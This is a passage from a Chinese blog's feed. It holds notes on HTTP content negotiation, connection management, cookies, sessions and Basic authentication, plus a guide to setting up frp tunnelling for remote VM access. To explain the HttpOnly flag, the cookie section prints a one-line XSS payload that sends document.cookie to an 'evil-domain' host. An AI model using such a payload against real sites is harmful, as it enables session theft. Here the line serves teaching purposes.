id="概述">概述</h4><p>我们在抓包或者写爬虫时经常注意到有很多以<code>Accept</code>开头的请求首部，还有<code>q=xxx</code>之类的东西，这些个东西都是什么意思？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222830544104_566_image-20230828110618870.png" alt="image-20230828110618870"><figcaption aria-hidden="true">image-20230828110618870</figcaption></figure><p>以<code>Accept-Language</code>为例，我们容易猜测到是用户浏览器向服务器请求的语言选项。一个URL常常需要代表若干不同的资源。例如那种需要以多种语言提供其内容的网站站点。如果某个站点有说中文的和说英语的两种用户，它可能想用这两种语言提供网站站点信息。理想情况下，服务器应当向英语用户发送英文版，向中文用户发送中文版——用户只要访问网站主页就可以得到相应语言的内容。</p><p>HTTP提供了内容协商方法，允许客户端和服务器作这样的决定。通过这些方法，单一的URL就可以代表不同的资源（比如，同一个网站页面的中文版和英语版），这些不同的版本称为变体。</p><h4 id="方式">方式</h4><p>一共有3种不同的方法可以决定服务器上哪个页面最适合客户端：客户端来选择、服务器自动判定、让中间代理来选。这三种技术分别称为客户端驱动的协商、服务器驱动的协商以及透明协商。</p><h5 id="客户端驱动">客户端驱动</h5><p>客户端发起请求，服务器发送返回一个页面，该页面包含指向该资源所有可用表示的链接，客户端作出选择后再发送第二次请求。</p><ul><li>优点：比较自然，服务器提供内容，由客户进行选择，减少Header冗余</li><li>缺点：增加了时延，至少要发送两次请求，第一次请求获取资源列表，第二次获取选择的副本；同时HTTP标准也没有明确指定提供可选资源链接的页面的格式，无法进行无感知的自动化选择。</li></ul><h5 id="服务器驱动">服务器驱动</h5><p>服务器检查客户端的请求首部集并决定提供哪个版本的页面。</p><ul><li>优点：比客户端驱动的协商要快。HTTP提供了q机制，允许服务器近似匹配。</li><li>缺点：首部集不匹配，服务器要做猜测；</li></ul><p>目前浏览器是采用服务器驱动的协商策略。当然服务器仍然可以在页面上提供语言选项供用户手动选择，就像大多数多语言的网页一样。</p><h4 id="内容协商首部">内容协商首部</h4><h5 id="客户端-1">客户端</h5><p>客户端可以用下面列出的<strong>内容协商首部</strong>集发送用户的偏好信息：</p><blockquote><p>Accept：告知服务器发送何种媒体类型；</p><p>Accept-Language：告知服务器发送何种语言；</p><p>Accept-Charset：告知服务器发送何种字符集；</p><p>Accept-Encoding：告知服务器采用何种编码；</p></blockquote><h5 id="服务器-1">服务器</h5><p>服务器用下面列出的<strong>实体首部</strong>集来匹配客户端的Accept首部集：</p><blockquote><p>Accept首部 　　 实体首部</p><p>Accept 　　　　　 Content-Type</p><p>Accept-Language Content-Language</p><p>Accept-Charset Content-Type</p><p>Accept-Encoding Content-Encoding</p></blockquote><p>同时，实体首部也不是必须的。比如，如果没有<code>Content-Language</code> ，则默认为内容适用于所有语言受众。</p><h5 id="q值">q值</h5><p>这里的q是指<strong>Quality values</strong>。</p><p>q值的范围从0.0~1.0（1.0优先级最高)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jef17glmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-jef17glmrh9u6a"><pre><code class="hljs http"><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</code></pre></div></div><p>这个首部表示：用户最愿意接受中文（zh），繁体的也行，英文次之。其他语言不接受(或以q=0.0表示)。如果是表示不特指的话是会以星号<code>*</code>表示。</p><h5 id="vary">vary</h5><p>前面提到，客户端驱动是很自然的思路，也就是服务端提供，客户选择。实际广泛采用的情况是服务端驱动，也就是客户端提供多种接受的选项，服务器提供一个最符合的。</p><p>但是，服务端有时候只能提供一种内容，比如我就只有中文版的网页供用户查看。有而且，实际上大多数时候会存在中间缓存服务器来缓解内容提供服务器的压力。<code>vary</code>就主要用在这种情形下。</p><p>HTTP的<code>vary</code>响应首部中列出了所有客户端请求首部，缓存服务器可以用这些首部来选择文档或者产生定制的内容。比如：若给客户端的响应内容取决于<code>Accept-Encoding</code>，<code>vary</code>首部就必须包含<code>Accept-Encoding</code>。回到上面说的情况，既然只有中文版的网页，<code>vary</code>首部就不包含<code>Accept-Language</code>，这样缓存服务器就不用根据用户的<code>Accept-Language</code>来进行内容选择了，可以省很多工作。</p><p>相应的，为了实现透明协商，<strong>缓存服务器必须为每个已缓存变体保存客户端请求首部和相应的服务器响应首部</strong>。也就是指明<code>vary</code>的内容，就必须要缓存。</p><h5 id="实例">实例</h5><p>以访问我自己的博客为例：</p><p>请求头(客户端)：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222833287138_195_image-20230828121728247.png" alt="image-20230828121728247"><figcaption aria-hidden="true">image-20230828121728247</figcaption></figure><p>响应头(服务器)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222835355015_405_image-20230828121901409.png" alt="image-20230828121901409"><figcaption aria-hidden="true">image-20230828121901409</figcaption></figure><p><code>vary</code>字段为<code>Accept-Encoding</code>。</p><h4 id="更多">更多</h4><p>内容协商策略为改善互联网用户的体验，提高传输效率提供了很大的帮助。但是内容协商使HTTP头增大了不少，而且在每一次请求中都必须发送这些首部。在首部很少的时候，这并不是问题，但是随着数量的增多，消息体的体积会导致性能的下降。带有精确信息的首部发送的越多，信息熵就会越大，也就准许了更多HTTP指纹识别行为，以及与此相关的隐私问题的发生。另外，如果希望更详细的了解内容协商算法，可以参见<a href="https://httpd.apache.org/docs/2.2/en/content-negotiation.html#algorithm">Apache服务器的内容协商算法</a>。</p><h2 id="总结">总结</h2><p>这一部分主要介绍了HTTP发展历史的前面部分，重点对HTTP/1.1的缓存控制策略和内容协商进行了讲解。后面会结合实践深入探索HTTP/2的内容。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用frp内网穿透远程访问Vmware虚拟机</title>
    <link href="/posts/18710/"/>
    <url>/posts/18710/</url>
    
    <content type="html"><![CDATA[<h1 id="使用frp内网穿透远程访问vmware虚拟机">使用frp内网穿透远程访问Vmware虚拟机</h1><h2 id="为什么需要内网穿透功能">为什么需要内网穿透功能</h2><p>大三的课程实验大多需要x86的linux环境，如果可以使用mac甚至手机或平板就可以远程访问Windows中的linux虚拟机，那就不用背着沉重又特别容易没电的游戏本跑来跑去了。经过一番探索发现内网穿透可以满足我的需求。</p><p>如果有自己的云服务器(关键是有公网ip)，便可以使用开源的frp工具进行内网穿透。开干！</p><h2 id="参考">参考</h2><p>本文只供个人记录过程方便后续所用，若需详细过程可以参考下面的文章:</p><p>基础使用</p><p>https://sspai.com/post/52523</p><p>配置开机自启(注意需要管理员权限)</p><p>https://gofrp.org/docs/setup/systemd/</p><h2 id="操作步骤">操作步骤</h2><p>服务器和客户端都需要下载:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tn9xndlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-tn9xndlmrh9u65"><pre><code class="hljs shell">wget https://github.com/fatedier/frp/releases/download/v0.47.0/frp_0.47.0_linux_amd64.tar.gz</code></pre></div></div><p><strong>注:下载时一定要注意选对系统架构。比如2016南京大学PA的环境是32位Ubuntu，就要下<code>frp_0.47.0_linux_386.tar.gz</code>。</strong></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h40bmtlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-h40bmtlmrh9u65"><pre><code class="hljs shell">wget https://github.com/fatedier/frp/releases/download/v0.47.0/frp_0.47.0_linux_386.tar.gz</code></pre></div></div><p>解压</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h909phlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-h909phlmrh9u65"><pre><code class="hljs shell">tar -zxvf frp_0.47.0_linux_amd64.tar.gz</code></pre></div></div><p>改名。非必须，但方便后续配置</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-bllj2tlmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-bllj2tlmrh9u65"><pre><code class="hljs shell">mv frp_0.47.0_linux_amd64 frp</code></pre></div></div><p>具体的配置项可以参见第一篇博客。<a href="https://gofrp.org/docs/examples/ssh/">官方</a>也说的很简洁明了。</p><p>按照官网里的<a href="https://gofrp.org/docs/setup/systemd/">开机自启</a>配置发现开机自启不成功，原因和解决方法可参见<a href="https://www.mmuaa.com/post/537d04e936b78620.html">这个博客</a></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0f32a7lmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-0f32a7lmrh9u65"><pre><code class="hljs shell">[Unit]<span class="hljs-meta prompt_"># </span><span class="language-bash">服务名称，可自定义</span>Description = frp clientAfter = network.target syslog.targetWants = network.target[Service]Type = simple<span class="hljs-meta prompt_"># </span><span class="language-bash">change to your own path of fps</span>ExecStart = /home/ubuntu32/frp/frpc -c /home/ubuntu32/frp/frpc.iniRestart=alwaysRestartSec=5[Install]WantedBy = multi-user.target</code></pre></div></div>]]></content>
    
    
    <categories>
      
      <category>小寄巧</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP总结(二)</title>
    <link href="/posts/31511/"/>
    <url>/posts/31511/</url>
    
    <content type="html"><![CDATA[<h1 id="http总结二">HTTP总结(二)</h1><p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="https://lunaticsky-tql.github.io/posts/64429/">上一部分</a>主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议。</p><h2 id="连接管理">连接管理</h2><p><strong>HTTP/1.0缺省为非持久连接</strong></p><ul><li>服务器接收请求、给出响应、关闭TCP连接</li></ul><p>获取每个对象需要两阶段</p><ul><li>建立TCP连接</li><li>对象请求和传输</li></ul><p>每次连接需要经历TCP慢启动阶段</p><p><strong>HTTP/1.1缺省为持久连接</strong></p><p>在 HTTP/1.1 [<a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc7540">RFC2616]</a> 中, Connection: keep-alive 被 IETF 正式标准化, 并默认开启keep-alive, 当不需要 TCP 连接维持时需要显式的在 Header 中设置Connection: close</p><p><strong>HTTP/1.1支持流水线机制</strong></p><p>在 HTTP/1.0 中, HTTP 请求都是完全阻塞的, 即客户端只有在上一次 HTTP请求完成以后才可以继续发送下一次 HTTP 请求, HTTP/1.1 对此作了改进, 允许pipelining 方式的调用, 即客户端可以在没有收到 Response的情况下连续发送多次 HTTP Request。</p><p>但是，服务端依旧是顺序对请求进行处理, 并按照收到请求的次序予以返回,也就说在 HTTP/1.1 中 HTTP请求的处理仍然是线性的。这就是所谓的队头阻塞问题。</p><p>举个例子，在流水线机制下即便 Client 连续发送了多个 HTTP Request,若其中<code>image1.jpg</code>因为某些原因服务器响应非常耗时, 则在其后的Request都处于排队阻塞的状态，这样以来即便客户给了服务器一堆请求，服务器还是单线程的，挨个相应每一个图片，流水线的意义也就不大了。</p><p>后面会讲到HTTP2通过流的方式解决了这个问题。</p><p>下面以客户端获取一个含有两个图片的网页为例说明比较HTTP1.0和HTTP1.1：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205258987659_478_20230825233745413813_440_image-20230825212013023.png" alt="image-20230825212013023"><figcaption aria-hidden="true">image-20230825212013023</figcaption></figure><h2 id="连接状态保存">连接状态保存</h2><p>HTTP是无状态的协议，协议对于发送过的请求和接受过的请求都不做持久化处理，这样可以更快地处理大量事物，确保协议的可伸缩性。不过我们实际上还是需要知道一些连接的信息，比如请求是哪个用户发过来的。可以通过session和cookie两种方式实现，当然也会结合进行使用。</p><h3 id="cookie">cookie</h3><h4 id="简介">简介</h4><p>cookie或许是我们上网中很熟悉的东西了。很多网站都会弹框要求我们选择是否接受所有cookie。</p><p><strong>cookie储存在客户端</strong>。Server 可以在 HTTP response中返回 <code>Set-Cookie</code> header 来告诉浏览器要设定 cookie。设定的语法如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jl6p6zlmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-jl6p6zlmrh9u6a"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>[cookie名称]=[cookie值]</code></pre></div></div><p>浏览器看到 <code>Set-Cookie</code> header 便会将 cookie储存起来，之后对同一个 domain 发送 HTTP request 的时候，浏览器就会将cookie 带在 HTTP request 的 <code>Cookie</code> header 里。</p><p>Request 中的 cookie header 会是 <code>[cookie名称]=[cookie值]</code>的形式，用分号串接之后的结果：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dntlmalmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-dntlmalmrh9u6a"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>[cookie1]=[value1]; [cookie2]=[value2]</code></pre></div></div><p>当然，Web 服务器需要建立后端数据库，记录用户信息。</p><h4 id="相关参数">相关参数</h4><p>在笔试题目中，也考察过cookie相关参数的含义。这里对此也进行细致的讲解。</p><p>Cookie 除了名称和值之外，通常还需要设定其他额外参数，下面会一一介绍。新增参数的方式是用分号区隔各个参数，例如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jt9lhclmrh9u6a"></i><span>plaintext</span><div class="collapse show" id="collapse-jt9lhclmrh9u6a"><pre><code class="hljs plaintext">user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div><p>简单地说，我们会用 <code>Domain</code> 和 <code>Path</code> 指定cookie 的可用范围，用 <code>Expires</code> 和 <code>Max-Age</code> 控制cookie 的有效期限，而 <code>HttpOnly</code>、 <code>Secure</code>、和<code>SameSite</code> 则是和安全性相关的参数。</p><h5 id="domain">Domain</h5><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jzig7klmrh9u6a"></i><span>plaintext</span><div class="collapse show" id="collapse-jzig7klmrh9u6a"><pre><code class="hljs plaintext">domain=example.com</code></pre></div></div><p><code>domain</code> 用来指定哪些网域可以存取这个 cookie。<strong>默认值是当前网域，但是不包含其子域。</strong></p><p>例如在 <a href="http://example.com">example.com</a> 底下设置的 cookie不指定 <code>domain</code> 的情况下，只有 <a href="http://example.com">example.com</a> 可以访问此 cookie，但子域如 <a href="http://subdomain.example.com">subdomain.example.com</a>则无法访问此 cookie。</p><p>如果我们想要让子域访问 cookie，就必须明确地设置 <code>domain</code>参数。 例如：当一个 cookie 指定 <code>domain=example.com</code> 时，包含<a href="http://example.com">example.com</a> 以及他的子网域 <a href="http://subdomain.example.com">subdomain.example.com</a>都能够访问这个 cookie。</p><h5 id="path">Path</h5><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-kuvwb4lmrh9u6a"></i><span>plaintext</span><div class="collapse show" id="collapse-kuvwb4lmrh9u6a"><pre><code class="hljs plaintext">path=/admin</code></pre></div></div><p><code>path</code> 参数用来指定哪些路径可以访问这个cookie。</p><p>例如：假设 domain 是 <a href="http://example.com">example.com</a>，且<code>path=/admin</code>，则 <a href="http://example.com/admin">example.com/admin</a> 或是子路径 <a href="http://example.com/admin/settings">example.com/admin/settings</a>都可以存取此 cookie，但 <a href="http://example.com">example.com</a>或是 <a href="http://example.com/home">example.com/home</a> 则无法访问此cookie。</p><p><strong><code>Path</code> 的默认值是当前的路径。</strong></p><p>一般而言来说，认证用途的 cookie 会设成<code>path=/</code>，让全站都可以存取此cookie，如此一来不管在网站的哪个路径下，server 都能认得用户的身份。</p><h5 id="expires-max-age">Expires, Max-age</h5><p><code>expires</code>， <code>max-age</code>参数的作用是设定cookie的有效期限。</p><p><strong>如果没有额外设置 <code>expires</code> 或是<code>max-age</code> 参数，当浏览器关闭之后，储存在浏览器的 cookie便会消失，这就是所谓的 session cookie</strong> 。</p><p>如果我们希望浏览器关掉之后 cookie 还是会被保存下来，那就必须设置<code>expires</code> 或是 <code>max-age</code>。</p><p><code>expires</code> 是 UTC 格式表示的有效期限，在 JavaScript 中可用<code>date.toUTCString()</code> 取得：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uhu3w2lmrh9u6a"></i><span>plaintext</span><div class="collapse show" id="collapse-uhu3w2lmrh9u6a"><pre><code class="hljs plaintext">cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div><p><code>max-age</code> 表示从设定开始算之后几秒之内 cookie是有效的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j41e31lmrh9u6a"></i><span>plaintext</span><div class="collapse show" id="collapse-j41e31lmrh9u6a"><pre><code class="hljs plaintext">cookie=value; max-age=3600</code></pre></div></div><h5 id="secure">Secure</h5><p><code>Secure</code> 参数的作用是让 cookie 只能通过 https 传递。<strong>Cookie 默认是不区分 http 或是 https 的。</strong></p><p>换句话说，当我们设定 <a href="http://example.com">http://example.com</a> 的 cookie 时， <a href="https://example.com">https://example.com</a> 也能看得到同样的cookie。</p><p>如果 cookie 设了 <code>secure</code> 参数，只有通过 https访问这个网站才能访问这个 cookie; 透过 http 存取这个网站会看不到这个cookie。</p><p>这个参数的作用在于保护 cookie 只能在 https 传递。话虽如此，我们还是不能将敏感信息储存在 cookie 中。</p><h5 id="httponly">Httponly</h5><p><code>HttpOnly</code> 参数的作用是防止 JavaScript 访问 cookie。</p><p>当一个 cookie 设置了 <code>httpOnly</code> 的属性之后，JavaScript就不能存取这个 cookie，但是浏览器在发送 request 的时候还是会帮你带在request header 里面。</p><p>这个参数的设计是为了安全性考量，因为如果 JavaScript 能够访问这个cookie 就有受到 XSS Attack （Cross-Site Scripting，跨站脚本攻击）的风险。</p><p>什么是 XSS Attack （跨站脚本攻击） 呢？ 简单的说，就是将一段恶意的JavaScript 代码通过表单等方式上传到server，之后这份表单数据在前端呈现的时候恶意的 JavaScript 代码会被当成是HTML 的一部分被执行。 假设黑客能够执行 JavaScript，便能很轻易地访问<code>document.cookie</code>，就能够窃取你用来登入的cookie，并且用你的身份做恶意的操作：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-d31yyelmrh9u6a"></i><span>javascript</span><div class="collapse show" id="collapse-d31yyelmrh9u6a"><pre><code class="hljs javascript"><span class="hljs-comment">// 把你的 cookie 送到黑客的服务器</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>()).<span class="hljs-property">src</span> = <span class="hljs-string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</code></pre></div></div><p>这就是为什么我们需要禁止 JavaScript 访问 cookie。</p><h4 id="samesite">Samesite</h4><p><code>Samesite</code> 的作用是防止 cookie以跨站方式传送，可以帮助避免 CSRF （Cross-Site RequestForgery，跨站请求伪造） 攻击。 由于篇幅有限，如果希望进一步了解CSRF，<a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">这里</a>是一篇很好的介绍CSRF的文章。同时SameSite也可以对第三方Cookie的使用进行一些限制，如下面所述。</p><h4 id="第三方cookie">第三方cookie</h4><p>网页很多时候会需要向其他域请求资源，例如：我们可能会用<code>&lt;img src="..."&gt;</code> 的方式嵌入一张其他域的图片。这些request也可以携带cookie，携带哪些cookie主要会根据资源的域。</p><p>举个例子说明：假设我现在浏览 <a href="http://example.com">example.com</a>，其中包含一张图片<code>&lt;img src="https://example.com/image.png"&gt;</code>，此时携带的cookie 就会是 <a href="http://example.com">example.com</a> 底下的cookie。 因为这个请求的域和网址栏的域同样都是 <a href="http://example.com">example.com</a>，所以这是一个相同域的请求。此时 <a href="http://example.com">example.com</a> 底下的 cookie又称作第一方 cookie （first-party cookie）。</p><p>如果 <a href="http://example.com">example.com</a> 包含另外一张图片<code>&lt;img src="https://ad.com/image.png"&gt;</code>，他的网址是 <a href="http://ad.com">ad.com</a>，此时携带的 cookie 就会是 <a href="http://ad.com">ad.com</a> 底下的 cookie。因为<a href="http://ad.com">ad.com</a> 不同于网址列的 <a href="http://example.com">example.com</a>，所以这是一个跨域请求。此时 <a href="http://ad.com">ad.com</a> 底下的 cookie 又稱作<strong>第三方cookie (third-party cookie)</strong>。</p><p>第三方 cookie 为什么重要呢？ 因为他能够跨域的追踪。 举例来说， <a href="http://example.com">example.com</a> 发出 <a href="http://ad.com">ad.com</a> 的请求时，会携带 <a href="http://ad.com">ad.com</a> 的 cookie。 如果同时有另一个域 <a href="http://anothersite.com">anothersite.com</a> 也会请求 <a href="http://ad.com">ad.com</a> 的资源，也会携带同样的 cookie。 如果这个cookie 是用来表示用户 id，则对 <a href="http://ad.com">ad.com</a>而言不管在哪个网域底下，他都知道两个网站的造访者都是你。这就是广告追踪的原理。</p><p>现在主流的浏览器都是默认禁止第三方cookie的。如果希望了解更多可以参阅<a href="https://zhuanlan.zhihu.com/p/131256002">这篇文章</a></p><h3 id="session">Session</h3><p>客户端第一次发送信息到服务器时，服务器为该客户端创建一个 session对象，该 session 包含客户端身份信息，同时为该 session 生成一个 sessionID。 服务端将这个 sessionID 分配给客户端，客户端发送请求时带有此 sessionID，服务端就可以区分客户端。</p><p>Session存储在服务器的内存中，根据业务需要，Session可以在内存中，也可以持久化到file，数据库，memcache，redis等。客户端只保存sessionid到cookie中，而不会保存session，session销毁只能通过invalidate或超时，关掉浏览器并不会关闭session。</p><h2 id="http认证">HTTP认证</h2><h4 id="基本认证">基本认证</h4><p>首先说明，这种认证方法虽然被HTTP协议本身所提供，但在实际中很少用到，具体原因会在后面解释，了解即可。</p><p>Basic认证中，最关键的三个要素：</p><ol type="1"><li>userid：用户的id。也就是我们常说的用户名。</li><li>password：用户密码。</li><li>realm：“领域”，其实就是指当前认证的保护范围。</li></ol><p>同一个server，访问受限的资源多种多样，比如资金信息、机密文档等。可以针对不同的资源定义不同的realm，并且只允许特定的用户访问。</p><p>在这种认证方法下，用户每次发送请求时，请求头中都必须携带能通过认证的身份信息。下面举例说明。</p><p>1.<strong>客户端(例如Web浏览器)</strong>：向服务器请求图片</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5hjbcclmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-5hjbcclmrh9u6a"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cover/girl1.jpg</span>  <span class="hljs-string">HTTP/1.1</span></code></pre></div></div><p>2.<strong>服务器</strong>：这个资源在安全区data里，是受限资源，需要基本认证，请带上你的用户名和密码再来请求</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-30o8xslmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-30o8xslmrh9u6a"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Authorization Required<span class="hljs-attribute">www-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm= "data"</code></pre></div></div><p>服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在<code>www-Authenticate</code>这个Header里面有两个值，<code>Basic</code>：说明需要基本认证，<code>realm</code>：说明客户端需要输入这个安全区的用户名和密码。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。</p><p>3.<strong>客户端</strong>：携带相应的用户名密码信息，发送给服务器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-s7bapjlmrh9u6a"></i><span>http</span><div class="collapse show" id="collapse-s7bapjlmrh9u6a"><pre><code class="hljs http">GET /cover/girl1.jpg  HTTP/1.1 <span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>BasicbHVuYXRpY3NreTp0cWxhMzE0</code></pre></div></div><p>Basic 内容为： <strong>用户名:密码</strong>的base64形式，如<code>lunaticsky:tqla314</code></p><p>这种认证方式看上去很简单直接，为什么说很少被真正使用呢？主要还是<strong>不安全</strong></p><ul><li><p>单纯使用HTTP的话，认证身份信息用明文传送的，所以这个基本认证的用户名和密码也是可以被人看到的，虽然它使用了Base64来编码，但这个编码很容易就可以解码出来，所以就是使用也是结合HTTPS来使用。</p></li><li><p>即使密码被强加密，第三方仍可通过加密后的用户名和密码进行重放攻击。</p></li><li><p>没有提供任何针对代理和中间节点的防护措施。也就是不能防止中间人攻击。中间人可以修改报文然后请求服务器。</p></li></ul><p>另外还有很多其他原因，比如这种基本认证浏览器会弹出一个弹窗要求用户输入用户名和密码，不能进行定制，用户体验不好。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205300371135_814_20230826160646173640_409_image-20230825225412200.png" alt="image-20230825225412200"><figcaption aria-hidden="true">image-20230825225412200</figcaption></figure><h4 id="session认证">Session认证</h4><p>这种认证方法结合了 Session 和 Cookie。服务端将本次会话信息以 Session对象的形式保存在服务端的内存、数据库或文件系统中，并将对应的 Session对象 ID 值 SessionID 以 Cookie 形式返回给客户端，SessionID保存在客户端的 Cookie 中。</p><p>这是一种有状态的认证方法：服务端保存 Session 对象，客户端以 Cookie形式保存 SessionID。</p><blockquote><p>1、用户向服务器发送用户名和密码。</p><p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p><p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p><p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id传回服务器。</p><p>5、服务器收到session_id，找到前期保存的数据，由此得知用户的身份。</p></blockquote><h2 id="总结">总结</h2><p>这一部分从HTTP连接的角度介绍了连接管理，连接状态保存和用户认证相关的内容。特别是根据最近笔试题目对cookie相关的知识点进行了较为详细的补充。后续会进一步从HTTP发展历程的角度重新深入的认识HTTP。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP总结(一)</title>
    <link href="/posts/64429/"/>
    <url>/posts/64429/</url>
    
    <content type="html"><![CDATA[<h1 id="http总结一">HTTP总结(一)</h1><p>在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP。可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。</p><h3 id="为什么需要http">为什么需要HTTP</h3><p>正如HTTP叫做<strong>超</strong>文本传输协议，大家都知道咱们的欲望是不能够很轻易的被满足的。有了网络之后，大家就发现文本已经没有办法满足我们大家对于传输的这样的一个需求了，那逐渐的我们就有了一些图片、音乐以及视频，甚至说还有一些超链接这样的一个需求，那这些资源他们针对是我们的Text，是一个扩充，所以说它叫做HyperTypes，也就是超文本。那传输这种资源的协议，我们就把它叫做HyperType Transfer Protocol了。</p><p>那在有了明确的边界之后，其实我们大家也能够想到，我们需要用元数据进行一个信息的描述，用来去描述这个信息它是什么类型的，就包括说我们刚刚看到的一些图片、音视频以及超链接这些东西，那这样之后我们就可以把这些东西就是具体的内容塞到一个它消息对应的地方。下面就详细介绍HTTP中关于元数据的一些细节。</p><h3 id="http请求方法">HTTP请求方法</h3><p>RESTful API这个词大概多多少少有所耳闻。RESTful(REST isREpresentational StateTransfer)是目前最流行的接口设计规范，在很多公司有着广泛的应用。RESTful最核心的特点是<strong>URL定位资源，用HTTP动词（GET,POST,DELETE,DETC等）描述操作。</strong>因此理解HTTP请求方法中原本的含义，有利于我们更好的理解资源管理的操作，设计良好的接口。</p><table><thead><tr class="header"><th style="text-align: center;">方法</th><th style="text-align: center;">描述</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">GET</td><td style="text-align: center;">请求指定的页面信息，并返回具体内容，通常只用于读取数据。</td></tr><tr class="even"><td style="text-align: center;">HEAD</td><td style="text-align: center;">类似于 GET请求，只不过返回的响应中没有具体的内容，用于获取报头。</td></tr><tr class="odd"><td style="text-align: center;">POST</td><td style="text-align: center;">向指定资源提交数据进行处理请求（例如提交表单或者上传文件），数据被包含在请求体中。</td></tr><tr class="even"><td style="text-align: center;">PUT</td><td style="text-align: center;">替换指定的资源，没有的话就新增。</td></tr><tr class="odd"><td style="text-align: center;">DELETE</td><td style="text-align: center;">请求服务器删除 URL 标识的资源数据。</td></tr><tr class="even"><td style="text-align: center;">CONNECT</td><td style="text-align: center;">将服务器作为代理，让服务器代替用户进行访问。</td></tr><tr class="odd"><td style="text-align: center;">OPTIONS</td><td 